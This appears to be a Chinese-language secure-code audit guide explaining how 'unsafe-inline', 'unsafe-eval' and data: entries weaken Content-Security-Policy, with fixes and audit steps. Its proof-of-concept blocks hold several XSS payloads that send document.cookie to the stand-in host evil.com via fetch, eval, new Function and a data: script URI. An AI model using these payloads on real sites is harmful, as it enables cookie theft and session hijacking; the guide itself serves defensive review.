# CSP unsafe 指令利用（CSP unsafe-inline / unsafe-eval / data: URI）

## 漏洞模式

CSP 策略中包含 `'unsafe-inline'`、`'unsafe-eval'` 或 `data:` URI，使 CSP 对 XSS 的防护大幅削弱甚至完全失效。这些指令通常是为了兼容旧代码而添加，但它们恰好允许了 XSS 攻击最常用的执行方式。

**核心原则：`script-src` 中包含 `'unsafe-inline'` 等同于没有 CSP——几乎所有 XSS payload 都是内联脚本。`'unsafe-eval'` 允许攻击者通过 `eval()` 执行字符串代码。`data:` 允许通过 `data:text/html` 或 `data:application/javascript` 注入可执行内容。**

## CSP 策略 vs 绕过 PoC

### unsafe-inline

```
❌ 有漏洞的 CSP：
Content-Security-Policy: script-src 'self' 'unsafe-inline'

绕过 payload（XSS 注入点存在时）：
<script>fetch('https://evil.com?c='+document.cookie)</script>
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
```

```
✅ 安全的 CSP（使用 nonce）：
Content-Security-Policy: script-src 'self' 'nonce-abc123'

<!-- 合法脚本 -->
<script nonce="abc123">console.log('ok')</script>

<!-- 注入脚本无 nonce，被 CSP 阻断 -->
<script>alert(1)</script>  ← Blocked by CSP
```

### unsafe-eval

```
❌ 有漏洞的 CSP：
Content-Security-Policy: script-src 'self' 'unsafe-eval'

绕过 payload（注入到 eval 上下文）：
eval("fetch('https://evil.com?c='+document.cookie)")
setTimeout("alert(document.cookie)", 0)
new Function("return fetch('https://evil.com')")()
```

```
✅ 安全的 CSP：
Content-Security-Policy: script-src 'self'

eval("alert(1)")  ← Blocked: eval is not allowed
setTimeout("alert(1)", 0)  ← Blocked: string argument to setTimeout
```

### data: URI

```
❌ 有漏洞的 CSP：
Content-Security-Policy: script-src 'self' data:

绕过 payload：
<script src="data:text/javascript,fetch('https://evil.com?c='+document.cookie)"></script>
```

```
❌ 也危险：img-src 中的 data:（通常安全，但注意）
Content-Security-Policy: default-src 'self'; script-src 'self'

<!-- 如果 default-src 允许 data:，object/embed 可能利用 -->
```

```
✅ 安全的 CSP：
Content-Security-Policy: script-src 'self' 'nonce-abc123'; object-src 'none'
```

## 常见错误配置

| CSP 指令 | 错误写法 | 为什么不安全 | 正确写法 |
|---------|---------|------------|---------|
| `script-src` | `'self' 'unsafe-inline'` | 允许任何内联脚本，XSS 直接执行 | `'self' 'nonce-{random}'` |
| `script-src` | `'self' 'unsafe-eval'` | 允许 eval/Function/setTimeout(string) | `'self'`（重构代码去掉 eval） |
| `script-src` | `'self' data:` | 允许 data: URL 加载脚本 | `'self' 'nonce-{random}'` |
| `default-src` | `'self' 'unsafe-inline' 'unsafe-eval'` | 所有未显式设置的指令继承这些值 | 分别设置每个指令 |
| `style-src` | `'self' 'unsafe-inline'` | 允许内联样式（CSS 注入风险较低但非零） | `'self' 'nonce-{random}'`（理想）|
| `script-src` | `'self' 'unsafe-inline' 'nonce-xxx'` | **nonce 和 unsafe-inline 同时存在时，CSP Level 2+ 浏览器忽略 unsafe-inline（安全），但 Level 1 浏览器仍允许（不安全）** | 确认不需要支持 CSP Level 1 浏览器后移除 `'unsafe-inline'` |

## unsafe-inline 的合理替代方案

| 需求 | unsafe-inline 替代 |
|------|-------------------|
| 内联 `<script>` 标签 | 使用 `'nonce-{random}'`，每个请求生成新 nonce |
| 内联事件处理器（`onclick`） | 重构为 `addEventListener` |
| 内联样式（`style=""`） | 移到外部 CSS 文件，或使用 `'nonce-{random}'` |
| 第三方脚本需要 inline | 使用 `'strict-dynamic'`（允许受信脚本加载的子脚本） |

## 审计方法

1. **定位 CSP 设置**：`rg "Content-Security-Policy|<meta.*http-equiv.*Content-Security-Policy"` 在配置文件和源码中
2. **检查 unsafe 指令**：提取 CSP 值，检查是否包含 `unsafe-inline` / `unsafe-eval` / `data:`
3. **评估覆盖范围**：CSP 是否只在部分页面生效？（中间件/filter 覆盖范围 vs 所有路由）
4. **区分 enforce vs report-only**：`Content-Security-Policy-Report-Only` 不实际阻断，仅报告
5. **检查 nonce 实现**：如果使用 nonce，确认 nonce 是否每请求随机生成（固定 nonce = 无效）
